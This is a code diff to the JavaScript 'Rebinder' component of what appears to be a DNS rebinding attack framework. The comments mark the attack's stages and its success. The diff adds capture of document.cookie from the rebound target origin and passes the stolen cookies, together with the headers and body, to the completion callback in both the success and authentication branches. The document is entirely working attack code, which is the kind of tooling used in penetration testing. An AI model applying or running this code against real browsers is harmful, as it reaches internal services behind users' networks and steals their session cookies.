@@ -1,5 +1,6 @@
 const Rebinder = () => {
     let headers = null;
+    let cookie = null;
     let body = null;
 
     let url = null;
@@ -61,6 +62,7 @@ const Rebinder = () => {
                 }
 
                 headers = r.headers;
+                cookie = document.cookie;
 
                 if (r.headers.get('www-authenticate') !== null) {
                     return new Promise(function (resolve, reject) {
@@ -83,7 +85,7 @@ const Rebinder = () => {
                     // Terminate the attack
                     const rebindingStatusEl = document.getElementById('rebindingstatus');
                     rebindingStatusEl.innerText = `DNS rebinding successful!`;
-                    rebindingDoneFn(headers, body);
+                    rebindingDoneFn(headers, cookie, body);
                 } else {
                     // Browser is probably confused about abrupt connection drop. 
                     // Let's wait for the next iteration.
@@ -104,7 +106,7 @@ const Rebinder = () => {
                     window.parent.postMessage({
                         status: "requiresHttpAuthentication",
                     }, "*");
-                    rebindingDoneFn(headers, null);
+                    rebindingDoneFn(headers, cookie, null);
                 } else { // We did not handle something
                     console.log('Unhandled error: ' + error);
                     window.parent.postMessage({
